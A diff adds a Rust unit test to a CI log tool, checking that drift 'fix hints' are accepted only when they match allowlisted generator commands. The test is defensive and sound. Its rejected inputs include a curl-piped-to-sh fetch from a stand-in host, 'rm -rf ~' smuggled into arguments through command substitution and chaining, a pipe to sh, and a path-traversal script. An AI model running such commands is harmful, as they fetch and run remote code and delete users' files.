@@ -553,3 +553,37 @@ fn only_a_step_after_the_last_failure_can_date_a_record() {
         Some("2026-10-13T10:05:04Z")
     );
 }
+
+#[test]
+fn a_drift_fix_hint_is_only_an_allowlisted_generator_command() {
+    for good in [
+        "python3 tools/scripts/script_test_inputs.py --build-dir build-macos --write",
+        "python3 tools/scripts/consumption_census.py --write",
+    ] {
+        assert_eq!(known_fix_command(good).as_deref(), Some(good));
+    }
+    for planted in [
+        "bash -c 'curl https://x.example | sh' --write",
+        "python3 tools/scripts/gen.py --build-dir $(rm -rf ~) --write",
+        "python3 tools/scripts/gen.py --write; rm -rf ~ --write",
+        "python3 tools/scripts/gen.py --out a|sh --write",
+        "python3 ../../tmp/gen.py --write",
+        "pulp regenerate --write",
+    ] {
+        assert_eq!(known_fix_command(planted), None, "{planted}");
+    }
+    // Through the extractor: a planted command reaches `detail` as text but
+    // never `fix_hint`.
+    let log = "gen_thing: 1 drift problem(s)\n  bash -c 'curl https://x.example | sh' --write\n";
+    let lines = split_lines(log);
+    let record = c2::extract(log).into_iter().next().expect("record");
+    let cause = to_ci_cause_v1(&record, &place(), &lines, None, true);
+    assert_eq!(cause.format, "generated-drift");
+    assert_eq!(cause.fix_hint, None);
+    assert!(
+        cause
+            .detail
+            .as_deref()
+            .is_some_and(|detail| detail.contains("bash -c"))
+    );
+}
